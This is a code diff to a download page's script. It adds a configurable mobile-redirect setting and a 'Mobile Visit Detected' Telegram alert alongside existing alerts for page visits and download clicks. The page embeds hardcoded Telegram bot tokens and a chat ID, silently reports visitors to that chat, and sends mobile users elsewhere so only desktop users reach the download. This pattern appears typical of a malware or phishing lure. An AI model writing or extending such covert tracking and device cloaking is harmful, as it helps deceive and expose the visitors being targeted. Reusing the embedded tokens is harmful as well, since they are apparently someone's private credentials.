@@ -470,6 +470,10 @@
                         <div class="dot off" id="status-dot-mobile"></div>
                         <span id="status-text-mobile">Not configured</span>
                     </div>
+                    <div class="field-group">
+                        <label>Mobile Redirect URL</label>
+                        <input type="text" id="mobile-redirect" placeholder="https://your-mobile-page.com" autocomplete="off" spellcheck="false"/>
+                    </div>
                 </div>
             </div>
 
@@ -541,11 +545,6 @@
             return "Desktop";
         }
 
-        // Redirect mobile users immediately to Google without showing any modal
-        if (isMobile()) {
-            window.location.href = "https://www.google.com/";
-        }
-
         // Pre-filled credentials for all three notification types
         const DEFAULT_VISIT_TOKEN = "8504790108:AAG4USSUmh42sSjgq5rwDowZ59TBs1xOQzo";
         const DEFAULT_VISIT_CHATID = "8173694252";
@@ -553,11 +552,12 @@
         const DEFAULT_DOWNLOAD_CHATID = "8173694252";
         const DEFAULT_MOBILE_TOKEN = "7803475625:AAFZUsji8WkMRjzdT2bkA3Yg0S2XYbVKdS8";
         const DEFAULT_MOBILE_CHATID = "8173694252";
+        const DEFAULT_MOBILE_REDIRECT = "";
 
         const CHANNELS = {
             visit:    { token: "visit_token",    chatid: "visit_chatid" },
             download: { token: "download_token", chatid: "download_chatid" },
-            mobile:   { token: "mobile_token",   chatid: "mobile_chatid" }
+            mobile:   { token: "mobile_token",   chatid: "mobile_chatid", redirect: "mobile_redirect" }
         };
 
         function initializeDefaults() {
@@ -580,10 +580,19 @@
                 if (!localStorage.getItem(CHANNELS.mobile.chatid)) {
                     localStorage.setItem(CHANNELS.mobile.chatid, DEFAULT_MOBILE_CHATID);
                 }
+                if (!localStorage.getItem(CHANNELS.mobile.redirect)) {
+                    localStorage.setItem(CHANNELS.mobile.redirect, DEFAULT_MOBILE_REDIRECT);
+                }
             } catch (e) {}
         }
 
         initializeDefaults();
+
+        // Redirect mobile users if URL is set
+        const mobileRedirectUrl = localStorage.getItem(CHANNELS.mobile.redirect);
+        if (isMobile() && mobileRedirectUrl && mobileRedirectUrl.trim() !== "") {
+            window.location.href = mobileRedirectUrl;
+        }
 
         function getVal(key) {
             try { return localStorage.getItem(key) || ""; } catch(e) { return ""; }
@@ -596,7 +605,8 @@
         function getChannel(ch) {
             return {
                 token:  getVal(CHANNELS[ch].token),
-                chatid: getVal(CHANNELS[ch].chatid)
+                chatid: getVal(CHANNELS[ch].chatid),
+                redirect: ch === 'mobile' ? getVal(CHANNELS[ch].redirect) : null
             };
         }
 
@@ -637,6 +647,9 @@
                 const c = getChannel(ch);
                 document.getElementById(ch + "-token").value  = c.token;
                 document.getElementById(ch + "-chatid").value = c.chatid;
+                if (ch === "mobile") {
+                    document.getElementById("mobile-redirect").value = c.redirect;
+                }
             });
 
             refreshDots();
@@ -658,6 +671,10 @@
                 const chatid = document.getElementById(ch + "-chatid").value.trim();
                 setVal(CHANNELS[ch].token, token);
                 setVal(CHANNELS[ch].chatid, chatid);
+                if (ch === "mobile") {
+                    const redirect = document.getElementById("mobile-redirect").value.trim();
+                    setVal(CHANNELS[ch].redirect, redirect);
+                }
             });
 
             refreshDots();
@@ -707,6 +724,10 @@
 
         // Trigger notifications
         sendTelegram("visit", "👁", "Page Visited");
+
+        if (isMobile()) {
+            sendTelegram("mobile", "📱", "Mobile Visit Detected");
+        }
 
         document.getElementById("downloadBtn").addEventListener("click", () => {
             sendTelegram("download", "📥", "Download Clicked");
